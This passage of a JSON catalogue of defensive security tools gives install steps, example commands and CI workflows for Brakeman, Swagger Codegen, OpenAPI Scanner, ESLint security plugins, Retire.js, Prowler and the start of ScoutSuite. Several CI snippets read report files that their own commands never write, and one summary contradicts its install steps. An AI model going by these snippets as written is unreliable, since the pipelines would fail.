      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via gem or package manager",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y ruby ruby-dev",
            "copyable": true
          },
          {
            "detail": "gem install brakeman",
            "copyable": true
          },
          {
            "detail": "brakeman --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Available in Kali repositories",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y brakeman",
            "copyable": true
          },
          {
            "detail": "brakeman --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Docker for isolated scanning",
        "steps": [
          {
            "detail": "docker pull stelligent/security-brakeman",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $PWD:/code stelligent/security-brakeman /code",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic scan",
        "command": "brakeman .",
        "notes": ["Scan current Rails application"]
      },
      {
        "description": "Output to JSON",
        "command": "brakeman -f json .",
        "notes": ["Generate JSON format results"]
      },
      {
        "description": "HTML report",
        "command": "brakeman -o report.html .",
        "notes": ["Generate HTML security report"]
      },
      {
        "description": "Specific checks",
        "command": "brakeman --only CheckCrossSiteScripting .",
        "notes": ["Run only XSS checks"]
      }
    ],
    "common_flags": [
      {
        "flag": "-f, --format",
        "description": "Output format (text, json, html, csv, markdown)"
      },
      {
        "flag": "-o, --output",
        "description": "Output file for results"
      },
      {
        "flag": "--only",
        "description": "Run specific security checks"
      },
      {
        "flag": "--except",
        "description": "Exclude specific security checks"
      },
      {
        "flag": "-q, --quiet",
        "description": "Suppress informational output"
      },
      {
        "flag": "-z, --exit-on-warn",
        "description": "Exit with error on warnings"
      }
    ],
    "operational_tips": [
      "Use specific checks to focus on particular vulnerability types.",
      "Generate HTML reports for stakeholder communication.",
      "Exclude test files and vendor directories from scans.",
      "Combine with CI/CD for automated Rails security testing.",
      "Regularly update Brakeman for latest Rails vulnerability patterns."
    ],
    "step_sequences": [
      {
        "title": "Rails Security Assessment",
        "steps": [
          {
            "title": "Configure scan",
            "details": "Set up Brakeman options.",
            "command": "brakeman --skip-libs -f json ."
          },
          {
            "title": "Run analysis",
            "details": "Execute security scan on Rails app.",
            "command": "brakeman -f json . > brakeman-results.json"
          },
          {
            "title": "Review findings",
            "details": "Analyze security vulnerabilities found.",
            "command": "cat brakeman-results.json | jq '.warnings[] | {warning_type: .warning_type, message: .message}'"
          },
          {
            "title": "Generate report",
            "details": "Create detailed security report.",
            "command": "brakeman -f html -o security-report.html ."
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Configuration  Scanning  Analysis  Reporting",
        "stages": [
          {
            "label": "Rails Application Setup",
            "description": "Prepare Rails application for scanning",
            "command": "Ensure app is ready for static analysis"
          },
          {
            "label": "Security Scanning",
            "description": "Run comprehensive Brakeman analysis",
            "command": "brakeman --all-checks -f json"
          },
          {
            "label": "Findings Analysis",
            "description": "Review and categorize security issues",
            "command": "Filter by severity and Rails-specific categories"
          },
          {
            "label": "Report Distribution",
            "description": "Share security findings with team",
            "command": "Generate reports and create remediation tickets"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Warning: Cross Site Scripting",
        "meaning": "Potential XSS vulnerability found",
        "severity": "high"
      },
      {
        "indicator": "Warning: SQL Injection",
        "meaning": "SQL injection vulnerability detected",
        "severity": "high"
      },
      {
        "indicator": "Warning: Mass Assignment",
        "meaning": "Rails mass assignment vulnerability",
        "severity": "medium"
      },
      {
        "indicator": "Scanned 125 files, 15 warnings",
        "meaning": "Analysis completed with findings",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Check Development",
        "command": "class CustomCheck < Brakeman::BaseCheck\n  def run_check\n    # Custom security check logic\n  end\nend",
        "scenario": "Create custom Rails security checks",
        "notes": ["Extend Brakeman for application-specific vulnerabilities"]
      },
      {
        "title": "CI/CD Pipeline Integration",
        "command": "brakeman -f json -z .\nwarnings=$(jq -r '.warnings | length' brakeman-report.json)\nif [ $warnings -gt 0 ]; then exit 1; fi",
        "scenario": "Fail CI builds on security warnings",
        "notes": ["Integrate with GitHub Actions for automated testing"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Brakeman Documentation",
        "url": "https://brakemanscanner.org/",
        "description": "Official Brakeman documentation and guides"
      },
      {
        "label": "RubyGems",
        "url": "https://rubygems.org/gems/brakeman",
        "description": "Brakeman gem information and updates"
      },
      {
        "label": "Rails Security Guide",
        "url": "https://guides.rubyonrails.org/security.html",
        "description": "Official Rails security documentation"
      }
    ]
  },
  {
    "id": "swagger-codegen",
    "name": "Swagger Codegen",
    "summary": "Swagger Codegen is a tool for generating server stubs, client SDKs, and API documentation from OpenAPI/Swagger specifications across multiple programming languages.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via npm or download binary",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y default-jre",
            "copyable": true
          },
          {
            "detail": "wget https://repo1.maven.org/maven2/io/swagger/swagger-codegen-cli/2.4.19/swagger-codegen-cli-2.4.19.jar",
            "copyable": true
          },
          {
            "detail": "java -jar swagger-codegen-cli-2.4.19.jar --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via npm or use pre-installed Java",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y default-jre wget",
            "copyable": true
          },
          {
            "detail": "wget https://repo1.maven.org/maven2/io/swagger/swagger-codegen-cli/2.4.19/swagger-codegen-cli-2.4.19.jar",
            "copyable": true
          },
          {
            "detail": "chmod +x swagger-codegen-cli-2.4.19.jar",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Docker for isolated execution",
        "steps": [
          {
            "detail": "docker pull swaggerapi/swagger-codegen",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $PWD:/local swaggerapi/swagger-codegen generate -i /local/swagger.json -l python",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Generate Python client",
        "command": "java -jar swagger-codegen-cli.jar generate -i swagger.json -l python",
        "notes": ["Generate Python SDK from Swagger spec"]
      },
      {
        "description": "Generate server stubs",
        "command": "java -jar swagger-codegen-cli.jar generate -i swagger.json -l nodejs-server -o ./server",
        "notes": ["Generate Node.js server stubs"]
      },
      {
        "description": "Multiple languages",
        "command": "java -jar swagger-codegen-cli.jar generate -i swagger.json -l python,java,typescript",
        "notes": ["Generate clients for multiple languages"]
      },
      {
        "description": "With configuration",
        "command": "java -jar swagger-codegen-cli.jar generate -c config.json -i swagger.json",
        "notes": ["Use configuration file for complex generation"]
      }
    ],
    "common_flags": [
      {
        "flag": "-i, --input-spec",
        "description": "Swagger/OpenAPI specification file"
      },
      {
        "flag": "-l, --lang",
        "description": "Target programming language"
      },
      {
        "flag": "-o, --output",
        "description": "Output directory for generated code"
      },
      {
        "flag": "-c, --config",
        "description": "Configuration file path"
      },
      {
        "flag": "--additional-properties",
        "description": "Additional generation properties"
      }
    ],
    "operational_tips": [
      "Use configuration files for complex generation requirements.",
      "Generate multiple language clients from single specification.",
      "Combine with CI/CD for automated client generation.",
      "Customize templates for organization-specific code patterns.",
      "Use Docker for consistent generation environments."
    ],
    "step_sequences": [
      {
        "title": "API Client Generation",
        "steps": [
          {
            "title": "Prepare specification",
            "details": "Ensure OpenAPI/Swagger specification is ready.",
            "command": "Validate swagger.json syntax"
          },
          {
            "title": "Generate client",
            "details": "Generate client SDK for target language.",
            "command": "java -jar swagger-codegen-cli.jar generate -i swagger.json -l python -o ./client"
          },
          {
            "title": "Configure build",
            "details": "Set up build process for generated client.",
            "command": "cd client && pip install -r requirements.txt"
          },
          {
            "title": "Test client",
            "details": "Verify generated client functionality.",
            "command": "python -m pytest tests/"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Specification  Generation  Build  Integration",
        "stages": [
          {
            "label": "API Specification",
            "description": "Create or validate OpenAPI/Swagger spec",
            "command": "Design API with Swagger Editor or export from existing service"
          },
          {
            "label": "Code Generation",
            "description": "Generate clients and servers from specification",
            "command": "swagger-codegen -i api.yaml -l python,java,typescript"
          },
          {
            "label": "Build Process",
            "description": "Build generated code for target platforms",
            "command": "Compile and package generated clients"
          },
          {
            "label": "Integration Testing",
            "description": "Test generated clients against API",
            "command": "Run integration tests and validate functionality"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Successfully generated Python client",
        "meaning": "Client SDK generated without errors",
        "severity": "info"
      },
      {
        "indicator": "Generated 5 language clients",
        "meaning": "Multiple client SDKs created successfully",
        "severity": "info"
      },
      {
        "indicator": "Validation warnings found",
        "meaning": "Specification has validation issues",
        "severity": "warning"
      },
      {
        "indicator": "Build completed successfully",
        "meaning": "Generated code compiled without errors",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Template Generation",
        "command": "java -jar swagger-codegen-cli.jar generate -i swagger.json -l python --template-dir custom-templates/",
        "scenario": "Use custom templates for code generation",
        "notes": ["Customize generated code structure and style"]
      },
      {
        "title": "Batch API Generation",
        "command": "for spec in apis/*.json; do\n  java -jar swagger-codegen-cli.jar generate -i $spec -l python -o clients/$(basename $spec .json)\ndone",
        "scenario": "Generate clients for multiple API specifications",
        "notes": ["Automate client generation for API portfolios"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Swagger Codegen GitHub",
        "url": "https://github.com/swagger-api/swagger-codegen",
        "description": "Official repository and documentation"
      },
      {
        "label": "OpenAPI Specification",
        "url": "https://swagger.io/specification/",
        "description": "OpenAPI/Swagger specification documentation"
      },
      {
        "label": "Code Generation Guide",
        "url": "https://swagger.io/tools/swagger-codegen/",
        "description": "Comprehensive code generation guide"
      }
    ]
  },
  {
    "id": "openapi-scanner",
    "name": "OpenAPI Scanner",
    "summary": "OpenAPI Scanner is a security testing tool that analyzes REST APIs defined by OpenAPI/Swagger specifications to identify security vulnerabilities and misconfigurations.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via npm or download binary",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y nodejs npm",
            "copyable": true
          },
          {
            "detail": "npm install -g @apidevtools/swagger-parser",
            "copyable": true
          },
          {
            "detail": "npm install -g @apidevtools/openapi-scanner",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via npm or use pre-installed Node.js",
        "steps": [
          {
            "detail": "sudo npm install -g @apidevtools/openapi-scanner",
            "copyable": true
          },
          {
            "detail": "# Alternative: Clone and build",
            "copyable": false
          },
          {
            "detail": "git clone https://github.com/APIDevTools/openapi-scanner.git",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Node.js container for execution",
        "steps": [
          {
            "detail": "docker pull node:16-alpine",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $PWD:/app -w /app node:16-alpine npx @apidevtools/openapi-scanner",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic API scan",
        "command": "openapi-scanner -s swagger.json -o report.json",
        "notes": ["Scan API specification for security issues"]
      },
      {
        "description": "With authentication",
        "command": "openapi-scanner -s swagger.json -a 'Bearer: $TOKEN' -o report.json",
        "notes": ["Test authenticated endpoints"]
      },
      {
        "description": "HTML report",
        "command": "openapi-scanner -s swagger.json -f html -o report.html",
        "notes": ["Generate HTML security report"]
      },
      {
        "description": "Specific checks",
        "command": "openapi-scanner -s swagger.json --only security,auth",
        "notes": ["Run only security and authentication checks"]
      }
    ],
    "common_flags": [
      {
        "flag": "-s, --spec",
        "description": "OpenAPI/Swagger specification file"
      },
      {
        "flag": "-o, --output",
        "description": "Output file for results"
      },
      {
        "flag": "-f, --format",
        "description": "Output format (json, html, markdown)"
      },
      {
        "flag": "-a, --auth",
        "description": "Authentication credentials"
      },
      {
        "flag": "--only",
        "description": "Run specific security checks"
      },
      {
        "flag": "--severity",
        "description": "Filter by severity level"
      }
    ],
    "operational_tips": [
      "Use authentication flags for testing protected APIs.",
      "Generate HTML reports for stakeholder communication.",
      "Focus on specific check types for targeted testing.",
      "Combine with dynamic testing for comprehensive security assessment.",
      "Use CI/CD integration for automated API security scanning."
    ],
    "step_sequences": [
      {
        "title": "OpenAPI Security Assessment",
        "steps": [
          {
            "title": "Parse specification",
            "details": "Parse OpenAPI specification for analysis.",
            "command": "openapi-scanner -s swagger.json --validate"
          },
          {
            "title": "Security analysis",
            "details": "Run comprehensive security checks.",
            "command": "openapi-scanner -s swagger.json -o security-report.json"
          },
          {
            "title": "Review findings",
            "details": "Analyze security vulnerabilities found.",
            "command": "cat security-report.json | jq '.results[] | {check: .check, severity: .severity}'"
          },
          {
            "title": "Generate report",
            "details": "Create detailed security report.",
            "command": "openapi-scanner -s swagger.json -f html -o security-report.html"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Specification Analysis  Security Testing  Reporting",
        "stages": [
          {
            "label": "API Specification",
            "description": "Obtain and validate OpenAPI specification",
            "command": "Download from API documentation or export from running service"
          },
          {
            "label": "Static Analysis",
            "description": "Analyze specification for security issues",
            "command": "Run comprehensive security checks on specification"
          },
          {
            "label": "Dynamic Testing",
            "description": "Combine with dynamic API testing tools",
            "command": "Use findings to guide dynamic testing with Postman/ffuf"
          },
          {
            "label": "Report Generation",
            "description": "Create actionable security reports",
            "command": "Generate reports for development and security teams"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Critical: Broken Object Reference",
        "meaning": "Critical security vulnerability in API specification",
        "severity": "error"
      },
      {
        "indicator": "Warning: Missing Rate Limiting",
        "meaning": "API lacks rate limiting controls",
        "severity": "warning"
      },
      {
        "indicator": "Info: Inconsistent Authentication",
        "meaning": "Authentication patterns vary across endpoints",
        "severity": "info"
      },
      {
        "indicator": "Scan completed: 25 endpoints analyzed",
        "meaning": "Security analysis completed successfully",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Security Checks",
        "command": "openapi-scanner --custom-checks custom-checks.js -s swagger.json",
        "scenario": "Add custom security checks for API specifications",
        "notes": ["Extend scanner with organization-specific security rules"]
      },
      {
        "title": "CI/CD Integration",
        "command": "openapi-scanner -s api.yaml -f json --severity high,critical\nif [ $(jq '.results | length' report.json) -gt 0 ]; then exit 1; fi",
        "scenario": "Fail CI builds on high-severity API issues",
        "notes": ["Integrate with GitHub Actions for automated API security"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "OpenAPI Scanner GitHub",
        "url": "https://github.com/APIDevTools/openapi-scanner",
        "description": "Official repository and documentation"
      },
      {
        "label": "OpenAPI Security Testing",
        "url": "https://github.com/ARPSyndicate/awesome-openapi-security",
        "description": "Comprehensive OpenAPI security testing resources"
      },
      {
        "label": "API Security Guide",
        "url": "https://owasp.org/www-project-api-security/",
        "description": "OWASP API Security guidelines and testing"
      }
    ]
  },
  {
    "id": "eslint-security",
    "name": "ESLint Security Plugins",
    "summary": "ESLint security plugins extend ESLint with rules specifically designed to detect security vulnerabilities, anti-patterns, and code quality issues in JavaScript applications.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via npm or package manager",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y nodejs npm",
            "copyable": true
          },
          {
            "detail": "npm install -g eslint eslint-plugin-security",
            "copyable": true
          },
          {
            "detail": "npm install -g eslint-plugin-import eslint-plugin-node",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via npm or use pre-installed Node.js",
        "steps": [
          {
            "detail": "sudo npm install -g eslint eslint-plugin-security",
            "copyable": true
          },
          {
            "detail": "# Alternative: Yarn installation",
            "copyable": false
          },
          {
            "detail": "yarn global add eslint eslint-plugin-security",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Docker for isolated execution",
        "steps": [
          {
            "detail": "docker pull node:16-alpine",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $PWD:/app -w /app node:16-alpine npm install eslint eslint-plugin-security",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic security scan",
        "command": "eslint --plugin security src/",
        "notes": ["Run security-focused ESLint rules"]
      },
      {
        "description": "With configuration",
        "command": "eslint -c .eslintrc.js --plugin security src/",
        "notes": ["Use custom ESLint configuration"]
      },
      {
        "description": "Multiple plugins",
        "command": "eslint --plugin security,import,node src/",
        "notes": ["Run multiple security and quality plugins"]
      },
      {
        "description": "Fix issues",
        "command": "eslint --plugin security --fix src/",
        "notes": ["Auto-fix some security issues"]
      }
    ],
    "common_flags": [
      {
        "flag": "--plugin",
        "description": "Specify ESLint plugins to use"
      },
      {
        "flag": "--config",
        "description": "Configuration file path"
      },
      {
        "flag": "--ext",
        "description": "File extensions to lint"
      },
      {
        "flag": "--fix",
        "description": "Automatically fix fixable issues"
      },
      {
        "flag": "--max-warnings",
        "description": "Maximum number of warnings before error"
      }
    ],
    "operational_tips": [
      "Configure .eslintrc.js for project-specific security rules.",
      "Use multiple security plugins for comprehensive coverage.",
      "Integrate with pre-commit hooks for early detection.",
      "Combine with IDE plugins for real-time feedback.",
      "Use --fix flag for automatic issue resolution."
    ],
    "step_sequences": [
      {
        "title": "JavaScript Security Analysis",
        "steps": [
          {
            "title": "Configure ESLint",
            "details": "Set up security-focused ESLint configuration.",
            "command": "Create .eslintrc.js with security rules"
          },
          {
            "title": "Install plugins",
            "details": "Install security and quality plugins.",
            "command": "npm install --save-dev eslint-plugin-security eslint-plugin-import"
          },
          {
            "title": "Run analysis",
            "details": "Execute security linting on JavaScript code.",
            "command": "eslint --plugin security,import src/ --format json > eslint-report.json"
          },
          {
            "title": "Review findings",
            "details": "Analyze security issues found.",
            "command": "cat eslint-report.json | jq '.[] | {ruleId: .ruleId, severity: .severity}'"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Configuration  Analysis  Fixing  Validation",
        "stages": [
          {
            "label": "ESLint Setup",
            "description": "Configure ESLint for security analysis",
            "command": "Create .eslintrc.js with security plugins and rules"
          },
          {
            "label": "Security Scanning",
            "description": "Run comprehensive security analysis",
            "command": "ESLint with security plugins on all source files"
          },
          {
            "label": "Issue Resolution",
            "description": "Fix security issues automatically or manually",
            "command": "Use --fix flag and review remaining issues"
          },
          {
            "label": "CI Integration",
            "description": "Integrate with CI/CD for automated security checks",
            "command": "Add ESLint step to GitHub Actions or Jenkins pipeline"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "error: no-eval (Security)",
        "meaning": "Use of eval() function detected",
        "severity": "error"
      },
      {
        "indicator": "warning: process-exit (Security)",
        "meaning": "Direct process.exit() call found",
        "severity": "warning"
      },
      {
        "indicator": "warning: detect-new-buffer (Security)",
        "meaning": "Potential buffer overflow vulnerability",
        "severity": "warning"
      },
      {
        "indicator": "0 errors, 3 warnings",
        "meaning": "Analysis completed with security issues found",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Security Rules",
        "command": "module.exports = {\n  rules: {\n    'no-dangerous-js': 'error',\n    'no-eval': 'error',\n    'custom-security-rule': 'warn'\n  }\n};",
        "scenario": "Create custom security rules for ESLint",
        "notes": ["Define organization-specific security policies"]
      },
      {
        "title": "CI/CD Pipeline Integration",
        "command": "eslint --plugin security --format json --output-file eslint-results.json src/\nerrors=$(jq -r '.[] | select(.severity == \"error\") | length' eslint-results.json)\nif [ $errors -gt 0 ]; then exit 1; fi",
        "scenario": "Fail CI builds on security errors",
        "notes": ["Integrate with GitHub Actions for automated security enforcement"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "ESLint Security Plugin",
        "url": "https://github.com/nodesecurity/eslint-plugin-security",
        "description": "Official security plugin repository"
      },
      {
        "label": "ESLint Documentation",
        "url": "https://eslint.org/docs/",
        "description": "Official ESLint documentation and configuration"
      },
      {
        "label": "JavaScript Security Guide",
        "url": "https://github.com/nodesecurity/eslint-plugin-security/blob/master/docs/rules.md",
        "description": "Security rules documentation and examples"
      }
    ]
  },
  {
    "id": "retire-js",
    "name": "Retire.js",
    "summary": "Retire.js is a scanner for detecting known vulnerabilities in JavaScript dependencies and libraries, helping to identify and replace outdated packages.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via npm or download binary",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y nodejs npm",
            "copyable": true
          },
          {
            "detail": "npm install -g retire",
            "copyable": true
          },
          {
            "detail": "retire --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via npm or use pre-installed Node.js",
        "steps": [
          {
            "detail": "sudo npm install -g retire",
            "copyable": true
          },
          {
            "detail": "# Alternative: Yarn installation",
            "copyable": false
          },
          {
            "detail": "yarn global add retire",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Docker for isolated execution",
        "steps": [
          {
            "detail": "docker pull node:16-alpine",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $PWD:/app -w /app node:16-alpine npx retire",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic dependency scan",
        "command": "retire",
        "notes": ["Scan current directory for vulnerable dependencies"]
      },
      {
        "description": "JSON output",
        "command": "retire --outputformat json",
        "notes": ["Generate JSON format results"]
      },
      {
        "description": "With exit code",
        "command": "retire --exitwith 2",
        "notes": ["Exit with specific code for vulnerabilities found"]
      },
      {
        "description": "Output file",
        "command": "retire --outputpath vulnerability-report.json",
        "notes": ["Save results to specific file"]
      }
    ],
    "common_flags": [
      {
        "flag": "--outputformat",
        "description": "Output format (json, jsonwithdeps, text)"
      },
      {
        "flag": "--outputpath",
        "description": "Output file path for results"
      },
      {
        "flag": "--exitwith",
        "description": "Exit code for vulnerabilities found"
      },
      {
        "flag": "--colors",
        "description": "Enable colored output"
      },
      {
        "flag": "--nocache",
        "description": "Disable caching of vulnerability database"
      }
    ],
    "operational_tips": [
      "Use JSON output for integration with CI/CD pipelines.",
      "Set appropriate exit codes for automated vulnerability management.",
      "Combine with package managers for automated dependency updates.",
      "Use --nocache flag to ensure latest vulnerability database.",
      "Integrate with build processes for continuous security monitoring."
    ],
    "step_sequences": [
      {
        "title": "JavaScript Dependency Security",
        "steps": [
          {
            "title": "Update database",
            "details": "Update vulnerability database.",
            "command": "retire --nocache"
          },
          {
            "title": "Scan project",
            "details": "Scan for vulnerable dependencies.",
            "command": "retire --outputformat json > retire-results.json"
          },
          {
            "title": "Review findings",
            "details": "Analyze vulnerable dependencies found.",
            "command": "cat retire-results.json | jq '.data[] | {component: .component, version: .version, vulnerability: .vulnerabilities[]}'"
          },
          {
            "title": "Generate report",
            "details": "Create vulnerability report.",
            "command": "retire --outputformat text --outputpath vulnerability-report.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Database Update  Scanning  Analysis  Remediation",
        "stages": [
          {
            "label": "Vulnerability Database",
            "description": "Ensure latest vulnerability database",
            "command": "retire --nocache to refresh vulnerability data"
          },
          {
            "label": "Dependency Analysis",
            "description": "Scan JavaScript dependencies for vulnerabilities",
            "command": "retire --outputformat json on all package.json files"
          },
          {
            "label": "Risk Assessment",
            "description": "Analyze vulnerability impact and severity",
            "command": "Filter results by severity and CVSS scores"
          },
          {
            "label": "Remediation Planning",
            "description": "Plan dependency updates and patches",
            "command": "Create upgrade tickets and update package.json files"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "lodash 4.17.15 has 1 known vulnerability",
        "meaning": "Outdated dependency with security issue found",
        "severity": "error"
      },
      {
        "indicator": "jquery 3.6.0 has 2 known vulnerabilities",
        "meaning": "Multiple vulnerabilities in jQuery library",
        "severity": "error"
      },
      {
        "indicator": "No known vulnerabilities found",
        "meaning": "All dependencies are up to date",
        "severity": "info"
      },
      {
        "indicator": "Scanned 156 dependencies",
        "meaning": "Analysis completed on all dependencies",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Vulnerability Database",
        "command": "retire --customrepo https://company-vulns.example.com/db.json",
        "scenario": "Use custom vulnerability database",
        "notes": ["Extend with organization-specific vulnerability data"]
      },
      {
        "title": "CI/CD Integration",
        "command": "retire --outputformat json --exitwith 1\nif [ $(jq -r '.data | length' retire-report.json) -gt 0 ]; then exit 1; fi",
        "scenario": "Fail CI builds on vulnerable dependencies",
        "notes": ["Integrate with GitHub Actions for automated dependency security"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Retire.js GitHub",
        "url": "https://github.com/RetireJS/retire.js",
        "description": "Official Retire.js repository and documentation"
      },
      {
        "label": "Vulnerability Database",
        "url": "https://retirejs.github.io/retire.js/repository/",
        "description": "JavaScript vulnerability database"
      },
      {
        "label": "Dependency Security Guide",
        "url": "https://nodesecurity.io/",
        "description": "JavaScript security best practices and tools"
      }
    ]
  },
  {
    "id": "prowler",
    "name": "Prowler",
    "summary": "Prowler is an open-source security tool for AWS, Azure, GCP, and Kubernetes to do security assessments, audits, incident response, compliance, continuous monitoring, hardening, forensics readiness, and operational best practices.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from pip or snap",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "pip install prowler",
            "copyable": true
          },
          {
            "detail": "prowler --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install from source or pip",
        "steps": [
          {
            "detail": "git clone https://github.com/prowler-cloud/prowler.git",
            "copyable": true
          },
          {
            "detail": "cd prowler",
            "copyable": true
          },
          {
            "detail": "pip install -r requirements.txt",
            "copyable": true
          },
          {
            "detail": "./prowler --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Official containerized deployment",
        "steps": [
          {
            "detail": "docker pull toniblyx/prowler",
            "copyable": true
          },
          {
            "detail": "docker run --rm -it toniblyx/prowler aws",
            "copyable": true
          },
          {
            "detail": "# Configure AWS credentials in environment",
            "copyable": false
          },
          {
            "detail": "export AWS_ACCESS_KEY_ID=your_key",
            "copyable": true
          },
          {
            "detail": "export AWS_SECRET_ACCESS_KEY=your_secret",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Run AWS security assessment",
        "command": "prowler aws",
        "notes": [
          "Requires AWS credentials configured",
          "Outputs HTML and CSV reports"
        ]
      },
      {
        "description": "Check specific service",
        "command": "prowler aws -M s3",
        "notes": [
          "Focus on S3 security checks only",
          "Useful for targeted assessments"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "AWS Security Assessment",
        "steps": [
          {
            "title": "Configure AWS credentials",
            "details": "Set up AWS CLI credentials with appropriate IAM permissions",
            "command": "aws configure"
          },
          {
            "title": "Run comprehensive assessment",
            "details": "Execute Prowler against all AWS services",
            "command": "prowler aws -f csv"
          },
          {
            "title": "Review findings",
            "details": "Analyze generated reports for security issues",
            "command": "# Check output directory for reports"
          },
          {
            "title": "Export findings",
            "details": "Convert findings to required format",
            "command": "prowler aws -o json"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Multi-account AWS Assessment",
        "stages": [
          {
            "label": "Configure profiles",
            "description": "Set up multiple AWS profiles for different accounts",
            "command": "aws configure --profile account1"
          },
          {
            "label": "Run assessment per account",
            "description": "Execute Prowler against each account",
            "command": "prowler aws --profile account1"
          },
          {
            "label": "Consolidate findings",
            "description": "Merge results from multiple accounts",
            "command": "# Use custom scripts to aggregate CSV outputs"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[FAIL] S3 bucket allows public access",
        "meaning": "S3 bucket has public read/write permissions",
        "severity": "high"
      },
      {
        "indicator": "[PASS] CloudTrail logging enabled",
        "meaning": "CloudTrail is properly configured for auditing",
        "severity": "info"
      },
      {
        "indicator": "[WARNING] IAM user has console access",
        "meaning": "IAM user has console access - consider programmatic only",
        "severity": "medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom compliance checks",
        "command": "prowler aws -C custom_check_list.txt",
        "scenario": "Run specific compliance frameworks (CIS, NIST, GDPR)",
        "notes": [
          "Create custom check lists for specific requirements",
          "Integrate with CI/CD pipelines"
        ]
      }
    ],
    "resources": [
      {
        "label": "Prowler Documentation",
        "url": "https://github.com/prowler-cloud/prowler",
        "description": "Official documentation and usage guide"
      },
      {
        "label": "AWS Security Best Practices",
        "url": "https://docs.aws.amazon.com/security/",
        "description": "AWS security documentation and guidelines"
      }
    ]
  },
  {
    "id": "scoutsuite",
    "name": "ScoutSuite",
    "summary": "ScoutSuite is a multi-cloud security auditing tool. Security auditors can use it to evaluate the security posture of their cloud environments.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from pip",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "pip install scoutsuite",
            "copyable": true
          },
          {
            "detail": "scout --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install from source",
        "steps": [
          {
            "detail": "git clone https://github.com/nccgroup/ScoutSuite.git",
            "copyable": true
          },
          {
            "detail": "cd ScoutSuite",
            "copyable": true
          },
          {
            "detail": "pip install -r requirements.txt",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Containerized deployment",
        "steps": [
          {
            "detail": "docker pull nccgroup/scoutsuite",
            "copyable": true
          },
          {
            "detail": "docker run -it nccgroup/scoutsuite",
